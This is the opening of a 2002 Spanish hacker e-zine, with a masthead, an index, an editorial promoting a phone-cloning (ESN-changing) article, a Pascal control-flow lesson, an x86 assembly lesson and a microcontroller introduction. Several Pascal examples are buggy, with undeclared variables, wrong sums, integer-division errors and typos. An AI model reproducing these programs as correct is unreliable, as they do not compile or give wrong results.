++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

                                        NOVAHACK ZINE

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

                                         Ano 1 No. 2

                                         20.OCT.2002

+-----------------------------------------------------------------------------------------+
|															|
| NovaHack Zine y sus coloboradores no se hacen responsables por el mal uso de los temas  |      | expuestos aqui. Todo es con fines educativos y de libre informacion.                    |
|               													|
+-----------------------------------------------------------------------------------------+

      "¿Hasta donde quieres llegar hoy?"

      "Yo solo se que no se nada..."

      "El cielo del lammer se encuentra en los pies del hacker..."

      "Error 404, page no found..."



                  Web oficial : www.novahack.com/nhz
               
               e-mail oficial : nhz@novahack.com

+----------------+
| Distribuidores |
+----------------+

http://www.novahack.com

http://www.prehackers.com

http://www.chaospc.tk

http://www.zine-store.com.ar



============================================================================================
[NHZ]----------------------------------[ INDICE ]--------------------------------------[NHZ]
============================================================================================


+-----+---------------------------------------------+----------------+
| No. | Titulo                                      | Autor          |
+-----+---------------------------------------------+----------------+
|   1 | Editorial                                   | NovaHack Zine  |
|-----|---------------------------------------------|----------------|
|   2 | Curso de Pascal II                          | keogh          |
|-----|---------------------------------------------|----------------|
|   3 | Curso de Ensamblador II                     | fyncher        |
|-----|---------------------------------------------|----------------|
|   4 | Introduccion a Microcontroladores           | <<Actinio89>>  |
|-----|---------------------------------------------|----------------|
|   5 | Clonacion de Celulares Nokia 51xx/61xx      | YeaYou         |
|-----|---------------------------------------------|----------------|
|   6 | NetStat                                     | Daru           |
|-----|---------------------------------------------|----------------|
|   7 | Scanner en Visual Basic                     | N1ck_Ma        |
|-----|---------------------------------------------|----------------|
|   8 | Conexion de dos PC's por el cable paralelo  | keogh          |
|-----|---------------------------------------------|----------------|
|   9 | Reparacion de Coolers                       | ShiMMyShaKe    |
|-----|---------------------------------------------|----------------|
|  10 | Vulnerabilidad de los sistemas de seguridad | Icaruss        |
|-----|---------------------------------------------|----------------|
|  11 | Bugs y como explotarlos                     | NovaHack       |
|-----|---------------------------------------------|----------------|
|  12 | Kevin Mitnick                               | keogh          |
|-----|---------------------------------------------|----------------|
|  13 | Windows 9x mas y mas estable                | Roswell        |
|-----|---------------------------------------------|----------------|
|  14 | Viruteca                                    | keogh          |
|-----|---------------------------------------------|----------------|
|  15 | Colabora con NovaHack Zine                  | NovaHack Zine  |
|-----|---------------------------------------------|----------------|
|  16 | Comunidad UnderGround de Mexico             | CUM            |
|-----|---------------------------------------------|----------------|
|  17 | The Mexican UnderGround                     | TheMU          |
|-----|---------------------------------------------|----------------|
|  18 | Sitios de Interés                           | NovaHack Zine  |
|-----|---------------------------------------------|----------------|
|  19 | Despedida                                   | NovaHack Zine  |
+--------------------------------------------------------------------+


+--------+
| STAFF: |
+--------+

keogh       <-------> Mexico
Fyncher     <-------> España
Actinio89   <-------> Venezuela
YeaYou      <-------> Mexico
Daru        <-------> Mexico
Nick_Ma     <-------> Mexico
ShiMMyShaKe <-------> Mexico
Icaruss     <-------> Mexico
Roswell     <-------> ??

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


============================================================================================
[1]------------------------------------[ Editorial ]-------------------------------------[1]
============================================================================================

                                      [NovaHack Zine]


Bienvenidos al segundo numero de NovaHack Zine. Antes que nada disculpen la tardanza de este numero.

Bueno en esta ocasion tenemos mas textos que el numero pasado, continuaremos con el curso de Pascal y Ensamblador, ademas otras cosillas, como por ejemplo reparar el cooler de tu PC, conectar dos PC's por el paralelo.

Uno de los textos mas importantes en este numero es el de Clonacion de celulares Nokia 51xx/61xx ya que se habla de como cambiar el ESN.

Otra noticia es que NovaHack y NovaHack Zine han cambiado de server y direccion, NovaHack: www.novahack.com y NovaHack Zine: www.novahack.com/nhz

Como debes de saber NHZ todavia no cuenta con logo asi que te retamos a que hagas uno para nosotros y lo mandes a nuestro email.

Pues a leer todo el contenido y cualquier duda, comentario, colaboracion, afiliacion a: nhz@novahack.com

s4lu2


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[2]----------------------------------[ Curso Pascal II ]---------------------------------[2]
============================================================================================

                                         [ keogh ]


Bueno aqui seguimos con la segunda parte del curso de pascal, espero que les este gustando.


+-------------------------------+
| CONTROL DE FLUJO DEL PROGRAMA |
+-------------------------------+


Sentencia IF...THEN...ELSE
---------------------------

Esta expresión es utilizada para ejecutar una sentencia en el caso que una condición establecida sea verdadera, o de lo ocntrario se podra ejecutar una sentencia distinta. Su sintaxis es:

IF <condicion> THEN
	instrucciones...
ELSE
	instrucciones


Si la condicion se cumple se realizarán las instrcciones despues del THEN, si la condición no se cumple realizara las instrucciones despues del ELSE. Si despues del THEN o ELSE se escribe más de una instruccion se debera comenzar con un BEGIN y terminar con un END;. 

IF <condicion> THEN
BEGIN
	instruccion1....
	instruccion2....
	instruccionN....
END
ELSE
BEGIN
	instruccion1....
	instruccion2....
	instruccionN....
END;

Tambien se pueden utilizar los operadores logicos como son AND y OR. Ejemplos:


1. Capturar una edad si es mayor de 18 decir es mayor de edad, si no decir que es menor de edad.

PROGRAM mayor_de_edad;
USES crt;
VAR
	edad:Integer;
BEGIN
	CLRSCR;
	writeln('Dame la edad: ');
	Readln(edad);
	IF edad>18 THEN
		Writeln('Eres mayor de edad')
	ELSE
		Writeln('Eres menor de edad');
	readln;  {este readln sirve para que la pantalla se quede esperando un enter}
END.


2. Leer dos numeros, si el primero es mayor que 20 hacer una suma y resta de los dos e imprimir resultado, si no hacer una multiplicacion de los dos e imprimir resultado.

PROGRAM dos_numeros;
USES crt;
VAR
	num1,num2,sum,res,mul:integer
BEGIN
	CLRSCR;
	Writeln('Dame el primer numero: ');
	readln(num1);
	Writeln('Dame el segundo numero: ');
	readln(num2);
	IF num1>20 THEN
	BEGIN
		sum:=n1+n2;
		res:=n1-n2;
		writeln('La suma es : ',sum);
		writeln('La resta es: ',res)
	END;
	ELSE
	BEGIN
		mul:=n1*n2;
		writeln('La multipicacion es: ',mul);
	end;
	readln;
END.



3. Leer un numero y si esta comprendido entre 70 a 100 escribir escribir "Buen Puntaje".

PROGRAM puntaje;
USES crt;
VAR
	num:Integer;
BEGIN
	CLRSCR;
	writeln('Dame el numero : ');
	readln(num);
	if (num>70)AND(num<=100) THEN
		Writeln('Buen Puntaje');
	readln
END.


Como pudieron ver puse 3 ejemplos un de IF sencillo otro con multiples instrucciones y otro con operador logico. Tambien los IF se pueden anidar, o sea un if dentro de otro.

IF <condicion> THEN
BEGIN
	instruccion...
	instruccion...
	IF <Condicion> THEN
		instruccion;
END;
ELSE
BEGIN
	IF <condicion> THEN
		instruccion;
	ELSE
		instruccion;
END;




Ciclos FOR
------------

El ciclo FOR repite una sentencia un determinado número de veces que se indica al momento de llamar el ciclo.

Lo que hace el FOR es que incrementa una variable en uno desde un valor inicial hasta un valor final ejecutando en cada incremento la sentencia que se quiere repetir. Su sintaxis es:

FOR identificador:=inicio TO fin DO
	instrucción;

Donde identificador es la variable que se incrementará, inicio es el primer valor que tendrá dicha variable y fin es el valor hasta el cual se incrementará la misma.

Si despues de que se inicia el ciclo hay mas de una instruccion se procedera a poner un begin y terminar con un end; ej:

FOR identificador:=inicio TO fin DO
Begin
	instruccion1;
	Instruccion2;
	............
	............
	instruccionN
end;

Ejemplos:

1.Un programa en Pascal que escriba en pantalla los numeros del 1 al 50.

PROGRAM ciclo_for1;
USES crt;
VAR
	num:Integer;
BEGIN
	clrscr;
	FOR num:=1 to 50 DO
		writeln(num);
	readln;
END.


2.Un programa en Pascal que lea 5 calificaciones e imprima el promedio.

PROGRAM ciclo_for2;
USES crt;
VAR
	cal,sum,prom,j:Integer;
BEGIN
	clrscr;
	sum:=0
	FOR j:=1 to 5 DO
	begin
		writeln('Dame la calificacion : ');
		readln(cal);
		sum:=sum+1
	end;
	prom:=sum/5;
	writeln('El promedio es: ',prom);
	readln;
END.


3.Escribir la tabla de multiplicar que pida el usuario.

PROGRAM ciclo_for3;
USES crt;
VAR
	num,j,mul:integer;
BEGIN
	clrscr;
	writeln('Dime la tabla de multiplicar que quieres: ');
	readln(num);
	mul:=0
	FOR j:=1 to 10 DO
	begin
		mul:=num*j;
		writeln(num,'X',j,'=',mul);
	end;
	readln;
END.


Es posible hacer que un ciclo cuente hacia atrás, es decir, que la variable en vez de incrementaese se decrementa. Para esto cambiamos la palabra TO por DOWNTO, y colocamos el valor mayor a la izquierda y el menor a la derecha. Ejemplo:

4.Imprima los numeros del 50 al 1.

PROGRAM ciclo_for4;
USES crt;
VAR
	j:integer;
BEGIN
	clrscr;
	FOR j:=50 DOWNTO 1 DO
		writeln(j);
	readln;
END.



CICLO WHILE
------------

Los ciclos while ofrecen la ventaja de que la ejecucion se realiza mientras se cumpla una condición, por lo tanto es posible controlar el número de repeticiones una vez iniciado el ciclo. Su sintaxis es:

WHILE <condicion> DO
	instrucción;

Donde condición es la condicion que se evaluara si es verdadera entra al ciclo, si no se sale o no entra. Si se utiliza mas de una instruccion se pondran las sentencias Begin y End como en el ciclo FOR:

WHILE <condicion> DO
begin
	instruccion1;
	Instruccion2;
	............
	............
	instruccionN
end;

Ejemplos:

1.Programa que escriba los numeros del 1 al 50

PROGRAM ciclo_while1;
USES crt;
VAR
	num:Integer;
BEGIN
	clrscr;
	num:=1
	while num<=50 DO
	Begin
		writenln(num);
		num:=num+1;
	end;
	readln;
END.

En el ejemplo anterior podemos ver que las sentencias se ejecutaran mientras num sea menor o igual a 50 y ademas de las instrucciones incrementamos la variable.


Ciclo Repeat-Until
------------------

Este tipo de ciclos es muy parecido a los ciclo While, la diferencia entre ambos es que en WHILE la condición se evalúa al principio del ciclo, en cambio en REPEAT-UNTIL se evelua al final, lo que significa que en un ciclo REPEAT-UNTIL la sentencia se ejecutará por lo menos una vez, cosa que no puede ocurrir en el ciclo WHILE. Ejemplo:

1. Imprimir los numeros del 1 al 50

PROGRAM ciclo_repeat_until1;
USES crt;
VAR
	num:Integer;
BEGIN
	clrscr;
	num:=1;
	REPEAT
		writeln(num);
		num:=num+1;
	UNTIL num=50;
	readln;
END.


Selecciones CASE
-----------------

Esta forma de control se utiliza cuando se va a evaluar una expresión que puede contener varios datos diferentes y en cada dato deberá realizar una acción especial. Por ejemplo, si se crea un menú con diferentes opciones se realizará un determinado proceso para cada acción, aunque la selección por parte del usuario se haga desde un mismo lugar. Sintaxis:

CASE identificador OF
	<valor1>: instruccion;
	<valor2>: instruccion;
	<valorN>: instruccion;
ELSE
	instruccion;

Donde valor1,valor2,valorN es el valor con el cual se ejecutaran las instrucciones. Ejemplo:

1. Preguntar un numero del rango 1 al 5 y decir cual es, si no esta en el rago decirlo.

PROGRAM case1;
USES crt;
VAR
	num:Integer;
BEGIN
	clrscr;
	writeln('Dame un numero del rango 1 al 5: ');
	readln(num);
	CASE num OF
		1: Writeln('El numero es 1');
		2: Writeln('El numero es 2');
		3: Writeln('El numero es 3');
		4: Writeln('El numero es 4');
		5: Writeln('El numero es 5');
	ELSE
		writeln('El numero no estaba en el rango indicado');
	readln;
END.



Esto es todo por esta entrega en la siguiente nos meteremos con funciones y procedimientos asi como las funciones mas comunes de pascal. Hasta la proxima.

s4lu2

by keogh

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[3]--------------------------[ Curso de Ensamblador II ]---------------------------------[3]
============================================================================================

                                      [ Fyncher ]


+-----------------------------------------------------------------------------------+
| CAPITULO 3 --> PRIMEROS PASOS. ¿COMO ES UN PROGRAMA EN ENSAMBLADOR?. HERRAMIENTAS |
+-----------------------------------------------------------------------------------+



Hola a todo el mundo. Primero de todo deciros que he cambiado de correo
Ahora mi correo es fyncher@hotmail.com, antes era k_mbe_t@hotmail.com
Dicho esto empezamos


1.- CONTENIDO DE UN MODULO EN ENSAMBLADOR

Lo primero con lo que deber­ais familiarizaros es con el aspecto de un programa escrito en ensamblador, mas que nada para que no os asusteis si abris uno a pelo. OJO con esto. Si abris un .EXE con el Visual C++, por ejemplo, lo que os encontrareis es el codigo ensamblador del fichero, pero sin los mnemonicos, o sea, que en vez de MOV, os aparecera el numero que corresponde a MOV para que el micro entienda la instruccion. Eso NO ES UN FICHERO EN ENSAMBLADOR COMO LOS QUE VAMOS A VER. En el curso se usan los mnemonicos. 
Vamos a lo que interesa una vez aclarado esto. En un programa sencillo de ensamblador podreis diferenciar 3 partes basicas que se denominan SEGMENTOS. Son las siguientes:

SEGMENTO DE DATOS --> dentro se declaran las variables del programa
SEGMENTO DE PILA --> se define una pila para usar con el programa. La pila se usa para almacenar variables temporalmente, por ejemplo. De hecho en las llamadas a funciones de lenguajes como C, los argumentos de las mismas se almacenan en la pila y la funcion los saca.
SEGMENTO DE CODIGO --> dentro esta el codigo de nuestro programa. Podemos usar procedimientos y macros (parecido a las funciones y macros de C)

Bueno esto es la estructura basica, puede variar, pero con esto podreis hacer cualquier cosa.
Vamos a ver si os habiais estudiado el capi­tulo 1. ¿De qué os suena eso de segmento? .................................
Pues si­, de la segmentacion, muy bien. Como recordareis la memoria de un 80x86 esta segmentada, es decir, "dividida" (pero es una division logica, no fi­sica) en porciones de 64 KB, y dentro de cada una de estas porciones las direcciones de memoria se indexan usando un par SEGMENTO:OFFSET. Pues vamos a enlazar esto con lo que estamos explicando.
Hemos dicho que tenemos 3 segmentos basicos en nuestro programa. Entonces vamos a almacenar en los registros de segmento la direccion donde empiezan. En DS almacenaremos la direccion donde empiecen los datos, en CS la direccion donde empieza el codigo y en SS la direccion donde empieza la pila. ¿Como hacemos eso? Pues muy facil, con la directiva ASSUME. No os preocupeis, ahora mismo os pongo un esqueleto de programa en ensamblador y lo veis. Ah, y mas adelante explico lo que es una directiva.

Esqueleto:

; Segmento de datos
DATOS SEGMENT
; Definiciones de variables
-------------------
-------------------
-------------------
DATOS ENDS

; Segmento de Pila
PILA SEGMENT
; Lo que se pone aqui ya lo veremos
PILA ENDS


; Segmento de codigo
CODIGO SEGMENT
	; Procedimiento principal
	INICIAL PROC
		ASSUME CS:CODIGO, DS:DATOS, SS:PILA
		
		; Codigo de nuestro programa
		-------------------
		-------------------
		-------------------
	INICIAL ENDP
CODIGO ENDS
END INICIAL


Uyuyuyuy que ya os empezais a liar. Venga vamos despacio a explicarlo todo. Lo primero es que habreis diferenciado los 3 segmentos de los que os hablaba: DATOS, PILA y CODIGO. El inicio de un segmento se marca con

	nombre-segmento SEGMENT

Y como habreis deducido su final se marca con

	nombre-segmento ENDS

Ah, en ensamblador podeis escribir todo con mayusculas o minusculas, es igual. 
Asi­ que pasamos rapido por los segmentos de datos y pila, que de momento estan claros, y vamos al de codigo. Lo primero que os llamara la atencion es ese:

	INICIAL PROC

Pues eso no es mas que el procedimiento principal. Para los que sepais C es como el main(). En ensamblador debereis dividir vuestro programa en procedimientos, al menos uno. Todos con el nombre que os de la gana. De como sabe el compilador cual es el principal os enterareis ahora. Bueno, os habris dado cuenta de que el inicio y fin de un procedimiento se marca asi­:

	nombre-proc PROC
		......
		......
		......
	nombre proc ENDP

NOTA: Despues de PROC le podeis añadir FAR o NEAR. Ya veremos la diferencia mas adelante. De momento si no se pone nada se toma como FAR. FAR y NEAR son directivas tambien.
Ahora vamos con el ASSUME. Esto es lo que os decia antes de almacenar en los registros de segmento la direccionn de comienzo de cada segmento. Ahi­ lo teneis, es asi­ de facil. Bueno el resto creo que lo entendeis todo. Hasta llegar a 

	END INICIAL

Eso lo que hace es decir que ya se ha terminado el fichero, y es aqui­ donde se marca el punto de entrada al programa, al procedimiento principal. La sintaxis es 

	END procedimiento-de-entrada

¿Veis que facil? De momento vamos bien. Ahora os voy a explicar las 3 cosas que os faltan para poder empezar a escribir codigo: Como son las instrucciones, como se definen variables y que se pone en el segmento de pila. Al final os pondre un primer programa de ejemplo, que escribe "Hola Mundo!" por pantalla. A medida que avancemos os ire poniendo mas codigo, y asi­ iremos aprendiendo. Vamos al ataque.


Un programa fuente ensamblador contiene dos tipos de sentencias:

	- Instrucciones --> Son los mnemonicos (el MOV, el ADD...)
	- Directivas --> Le indican al ensamblador que hacer con las operaciones y los datos


  1.1 Instrucciones

	El formato de una instruccion es el siguiente:

		[etiqueta]  instr  [operandos]  [comentario]

     	Los corchetes indican que el campo especificado entre ellos es opcional. Vamos a ver los campos por separado

        Campo de etiqueta: 
		Es el nombre simbolico de la primera posicion de una instruccion, puntero o dato. Consta de hasta 31 caracteres que pueden ser las letras de la A a la Z, los numeros del 0 al 9 y algunos caracteres especiale	como @, _,. y $. Reglas:

- Si hay un punto . debe colocarse como primer caracter de la etiqueta.
- El primer caracter no puede ser un numero.
- No se pueden utilizar los nombres de instrucciones o registros como nombres de etiquetas.

Veremos mas sobre las etiquetas (que son etiquetas NEAR o FAR) mas adelante.

        Campo de instruccionn: 
		Contiene el mnemonico de una culquiera de las instrucciones. aprovecho para decir que no voy a dedicar un	capi­tulo a poner todas las instrucciones, mas que nada porques eso es ti­pico de una gui­a de referencia, y no de aprendizaje. Las iremos viendo segunn vayan saliendo.

        Campo de operandos:
		Indica cuales son los datos implicados en la operacionn. Puede haber 0, 1 o 2; en el caso de que sean dos al 1º se le llama destino y al 2º -separado por una coma- fuente.

                mov ax, es:[di]     -->     ax         destino
                                            es:[di]    origen

		Los operandos pueden ser registros (de 8 o 16 bits), direcciones de memoria (de 8 o 16 bits) o valores inmediatos (de 8 o 16 bits). ¿En que se diferencia un valor inmediato de 8 bits de uno de 16? Pues muy facil. Con 8 bits solo podremos representar numeros entre 0 y 2exp8 -1 (255). El 256 y sucesivos ya necesitarian 16 bits para representarse

        Campo de comentarios:
		Los comentarios en ensamblador se ponen con punto y coma <<;>>. Cuando se encuentra este si­mbolo todo lo que venga despues hasta el fin de linea no se toma en cuenta.

	Bueno aqui­ hay que pararse para hablar un poco mas de los operandos. Hemos dicho que pueden ser de 3 tipos, pero realmente son 7. ¿Como es eso? Pues para entenderlo habra que ver los MODOS DE DIRECCIONAMIENTO. Como concepto previo intuitivo pensad en el numero 150. Es un operando de tipo valor, ¿verdad? Pues bien, dependiendo de como lo escribamos puede representar al numero 150 o a la direccion de memoria numero 150. Asi­, en realidad con el numero 150 tenemos 2 posibles formas de referirnos a un dato: un valor directamente o una posicion de memoria (la 150) que almacena un valor. Para simplificar vamos a ver las diferentes formas de referenciar un dato (los modos de direccionamiento).
	NOTA: En los ejemplos los modos de direccionamiento se apreciaran en el segundo operando, el primero sera siempre un registro.

		- Direccionamiento inmediato: 
			El operando es un numero, una constante

                 		ej.: mov ax, 69

     		- Direccionamiento de registro: 
			El operando es un registro. Por cierto, el operando fuente y el destino deben ser de igual tamañoo.

				ej. : mov dx, ax
				      mov bh, cl	

     		- Direccionamiento directo o absoluto: 
			El operando es un numero que representa una direccion de memoria. Para saber que es una direccion de memoria se pone un numero entre corchetes. Ahora una pregunta. La direccionn de memoria de la que hablamos, ¿relativa a que segmento es? ¿a CS, a DS o a SS? ¿ o a ES (que se puede utilizar como segmento extra auxiliar). Bueno si no se dice nada se refiere a DS. A ver no os perdais. ¿Que tenemos en DS? Pues variables, ya veremos como se definen, pero son variables. Si yo escribo DS:[0](SEGMENTO:OFFSET), ¿que es eso? Pues el primer byte de la primera variable definida. Si mi primera variable es un numero de tipo byte, pues lo que tenemos es la variable entera. Asi­, si yo pongo DS:[59] estamos en el byte 59 del segmento de datos (de mis variables), que puede ser el inicio de una variable o el segundo byte de la misma, o el tercero....
			Espero que me hayais entendido, quiero que tengais siempre presente el concepto de segmento. Pero si no entendeis esto ahora tranquilos, en el codigo del final lo vereis claro

           ej. : MOV   ax,[57D1h]  --> mover a ax el valor almacenado en la dir. [57D1h] (offset de DS, en hexadecimal)
                 MOV   ax,es:[429Ch]

			En el segundo caso estamos usando ES, ¿ein?. Pues si, podeis definir, por ejemplo, un segundo segmento de datos y meter mas variables dentro. Ya sabeis, los basicos son 3, pero podeis hacer mas.


    		 - Direccionamiento indirecto: 
			El operando se encuentra en una direccion señalada por un registro de segmento*16	mas un registro base (BX/BP) o I­ndice (SI/DI). (Nota: BP actua por defecto con SS).

				ej. : mov ax,[bp]     ; ax = [ss*16+bp]
        			      mov es:[di],ax  ; [es*16+di] = ax


		 - Indirecto con Indice o indexado: 
			El operando se encuentra en una direcciÃ³n determinada por la suma de un 
registro de segmento*16, un registro de Ã­ndice, SI o DI y un desplazamiento de 8 Ã³ 16 bits. 

				ej. : mov ax, tabla[di] ; es igual que mov ax, [tabla+di]. Como arrays en C
				      mov bx, es:tabla[si]	

		 - Indirecto con base e indice o indexado a base: 
			El operando se encuentra en una direccion especificada por la suma de un registro de segmento*16, uno de base, uno de i­ndice y opcionalmente un desplazamiento de 8 o 16 bits:
				
				ej. : mov ax, tabla[bx][di]
				      mov cs:tabla[bx][si] ; si, CS puede almacenar variables, yo nunca dije que no XD	

	¿Habeis visto que movida con los modos de direccionamiento? Bueno no os preocupeis, al final usareis 2 o 3, y os acostumbrareis. Los 2 ultimos son muy parecidos a manejar tablas (arrays) en C o Pascal



  1.2 - Directivas
	
	Como ya dijimos sirven para darle informacion al ensamblador de como son o que hacer con los datos. La sintaxis es

		[nombre]  nombre_directiva  [operandos]  [comentario]

	Solo es obligatorio el campo «nombre_directiva»; los campos han de estar separados por al menos un espacio en blanco. La sintaxis de «nombre» es analoga a la de la «etiqueta» de las li­neas de instrucciones, aunque nunca se pone el sufijo «:». El campo de comentario cumple tambien las mismas normas.

	Directivas hay muchas pero las que vamos a ver ahora son las de definicion de variables. Asi­ entendereis lo que va dentro del DATOS SEGMENT ese. Podeis poner dos cosas:

		- Definicion de si­mbolos. 
			Se usa la directiva EQU. Sirve para asignar nombre simbolicos a expresiones fijas (constantes)
				ej .: pi EQU 3.14 --> ahora podeis escribir "pi" en el codigo y sera 3.14 (#define en C)

			Tambien se puede usar = para asignar nombres a expresiones variables
				ej .: edad = 22 --> edad la podeis variar

		- Definicion de datos.
			Para definir variables. Hay 5 posibles segun el tamaÃ±o del tipo de datos que definamos:

DB --> definir byte	ej.: cont DB 0 (cont=0. Valdria cont DB ? para no asignar valor)
DW --> definir palabra (2 bytes) ej.: long DW 45425
DD --> definir doble palabra (ya paso de poner ejemplos, lo habeis pillado ¿no? XD)
DQ --> definir cuadruple palabra
DT --> definir 10 bytes


Aqui os pongo un ejemplo para que no os perdais y sigais con lo de segmentos en la cabeza

				msg DB "Hola que tal$"

Anda, os he pillado ¿eh? ¿creiais que lo habiais entendido bien eh? XDDD
No os preocupeis que os explico lo que significa. Lo anterior es una cadena, y cada uno de sus elementos es un byte. Es como sigue (suponemos que esta en DS, y q es la primera variable definida):
			
				DS:[0] --> "H"
				DS:[1] --> "o"
				DS:[2] --> "l"
				etc

Y lo de "$" es para marcar fin de cadena, como \0 en C.
Ahora entendeis lo que os contaba en el direccionamiento absoluto ¿verdad? Volvedlo a leer venga.

Seguro que ya no dudais con esta pregunta. Si yo tengo 

			DATOS SEGMENT
				i 	DD 2
				long 	DW 5
				msg	DB "Cadena$"
			DATOS ENDS

			¿Cuanto valen DS:[0], DS:[1]....?

				DS[0] = 0
				DS[1] = 0
				DS[2] = 0
				DS[3] = 2 ; 4 byte para la variable i

				DS[4] = 0 
				DS[5] = 5 ; 2 bytes para la variable long 

				DS[6] = "C" (o lo que es lo mismo, 67, que es su valor ASCII)
				DS[7] = "a"
				etc
				

  1.3 - La pila

	Bueno, como os dije la pila sirve como almacen temporal auxiliar. ¿Que debeis poner en el segmento de pila de un programa? Pues solo debeis poner el espacio que vais a usar. Se hace asi:


	PILA SEGMENT STACK
	DB 128 (?)
	PILA ENDS

Lo de STACK se pone siempre. Esto reserva 128 bytes para la pila. Tambien podriais haber puesto 
	
	DB 128 ('PILA')

Que os reservaria 128 veces el espacio que ocupa la palabra 'PILA'. Que chorrada, ¿no?

Con que pongais lo primero vale. El espacio, bueno, vosotros vereis, 128  bytes esta bien, no creo q almaceneis a 	la vez mas de 128 bytes dentro. Ah es necesario que definais en vuestro programa un segmento de pila

				
2 .- PROGRAMA DE EJEMPLO

Hala no sufrais mas que ya os pongo un ejemplo, el ti­pico "Hola Mundo!". Espero que lo entendais todo



;--------------------------------------------------
; Fichero : hola.asm

PILA SEGMENT STACK
DB 128 (?)
PILA ENDS


DATOS SEGMENT
	msg DB "Hola Mundo!$"
DATOS ENDS


CODIGO SEGMENT
	ASSUME CS:CODIGO, DS: DATOS, SS: PILA ; el assume puede ir antes del proc

	Entrada PROC
	
		mov ax, DATOS
		mov ds, AX 
		; esto es para pasar la direccion de comienzo de datos a DS. Regla: no se puede utilizar un registro de 		
            ; segmento como destino de mov si la fuente es un valor. La fuente debe ser otro registro, de ahi el paso 		
            ; intermedio

		mov dx, OFFSET msg
		; movemos la direccion de comienzo de msg a DX. Lo de OFFSET es un operador que             nos devuelve la posicion de 		
            ; una variable cualquiera dentro de un segmento. Aqui no haria falta, ya que si ponemos mov dx, msg 		
            ; cargamos en dx ds[0],pero de esta manera es mas elegante y estandar. Tambien valdria LEA DX, msg 
		;(LEA = Load Efective Address)		


		mov ah, 9
		int 21h
		; ahora llamamos a la INT 21 con AH=9, que corresponde a la funcion de sacar por pantalla lo que hay en dx.
		; Hay otras 2 formas de sacar algo por pantalla ademas de la INT 21 (interrupcion del DOS), que son usar 
		; la INT 10 (int de la BIOS) o mover directamente lo que se quiera a una direccion igual o mayor a B800H 		
           ; que es donde comienza la memoria de pantalla. Ya veremos lo de memoria de pantalla mas adelante

		mov ax, 4c00h
		int 21h
		; llamamos a INT 21 con AX=4c00h, que corresponde a salir al DOS

	Entrada ENDP
CODIGO ENDS
END Entrada
;--------------------------------------------------


Hala ya esta. Para el proximo numero ya empezare a meter codigo mas "serio", que sera el codigo que ire haciendo en practicas.

Bueno para los sedientos de aprender mas os voy a pasar una direccion donde viene TODO sobre el ensamblador del 80x86 y ademas en español. Eso si­, es bastante denso y requiere de algunas nociones en programacion y arquitectura. De todas formas aqui­ lo teneis --> http://atc.ugr.es/docencia/udigital/

Venga un saludo y hasta el proximo capi­tulo


Fyncher

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

============================================================================================
[4]--------------------------INTRODUCCIÓN A MICROCONTROLADORES---------------------------[4]
============================================================================================

                                     [ <<Actinio89>> ]

+-----------------------------+
| Hagamos un poco de Historia |
+-----------------------------+

 No podemos olvidar que la INTEL fue la compañía de que desarrolló el primer microprocesador en el mundo, el 4004 en el año 1971. Este microprocesador, con sólo 2300 transistores, fue el origen de una gran cantidad de dispositivos que se desarrollaron posteriormente, los cuales integran actualmente más de un millón de transistores en un encapsulado. Tampoco podemos olvidar del hecho que INTEL ha desarrollado microprocesadores tan exitosos como el 8086, 80286, 80386 y 80486 y más recientemente la línea PENTIUM. 
 
Pero, quien dijo que se quedaría durmiendo en los laureles en materia de microcontroladores (nuestro caso de estudio), pues no, INTEL  ha fabricado microcontroladores de 8 y 16 bits, cada uno de ellos tiene amplias posibilidades de uso y prestaciones que los hacen adecuados para gran cantidad de aplicaciones. Los microcontroladores INTEL han tenido gran aceptación, hasta el punto que otros fabricantes han optado por producir sus propias versiones de estos dispositivos, como el caso de SIEMENS y PHILIPS.

Introducción

 En ente mundo del hacking y de la internet, se habla de microprocesadores y computadores a gran escala, pero también existen otros dispositivos ( si estás en la universidad estudiando alguna carrera ligada a la electrónica o eres curioso) habrás oído acerca de MICROCONTROLADORES; si no es así, no importa ( jejeje..) acá comenzaremos alguillo respecto al tema. J

Para darle un toque más formal al tema, comenzaremos diciendo que hoy en día, el incremento competitivo en el mercado de la industria electrónica crea la necesidad de diseñar sistemas con mejores características, de menor tamaño, bajos requerimientos de energía, mejor realización, teniendo un especial énfasis sobre todo en la facilidad de duplicidad del sistema diseñado. La lógica definida por el usuario y la realizada por el fabricante permite individualizar a los sistemas diseñados, así como también apegarse más a los requerimientos específicos del usuario.

Ya tanta palabrería nos cansa no?, jeje....

Bueno, entonces ¿Qué es un microcontrolador?

Un microcontrolador es todo un "sistema mínimo" dentro de un solo dispositivo, lo cual ofrece un enorme panorama hacia el mundo de la compatibilidad. Este dispositivo contiene:
un CPU (basado principalmente en un microprocesador de 4, 8 ó 16 bits), puertos paralelos de entrada y salida, puerto serie, timers, contadores, memorias, y en algunos casos hasta convertidores analógicos digitales, todo eso dentro de un solo chip.

Pero ¿Por qué un microcontrolador y no un microprocesador?

 Pues bien, digamos que el microcontrolador está encaminado básicamente hacia aplicaciones concretas en donde el espacio, y número de componentes es mínimo, además, los cambios o ampliaciones futuras del sistema son casi nulos. Por otro lado, un microprocesador se destina a sistemas donde su expansión a corto o mediano plazo es factible. A pesar de que un microprocesador es más rápido que un microcontrolador para la ejecución de sus instrucciones, en la mayoría de los casos es necesario interconectarlo con dispositivos periféricos.

  Además, un microcontrolador puede ser utilizado con un mínimo número de componentes en trabajos específicos y en un amplio rango de aplicaciones, tales como: sistemas de control de alarmas, tableros de control en industria automotriz, en la instrumentación médica, teclados de computadora, sistemas portátiles de almacenamiento de datos, equipos de laboratorio, etc.

 Características de los microcontroladores 8X51
·	CPU de ocho bits, optimizada para aplicaciones de control.
·	Procesador Booleano (operación sobre bits).
·	Espacio de memoria de programa de 64 Kbytes.
·	Espacio de memoria de datos de 64 Kbytes
·	4 Kbytes de memoria interna de programa.
·	128 bytes de memoria RAM interna.
·	32 líneas de entrada/salida, direccionables bit a bit , (cuatro puertos), muy importante ;-)
·	Comunicación asíncrona Full Duplex
·	5 fuentes de interrupción
·	Oscilador interno.

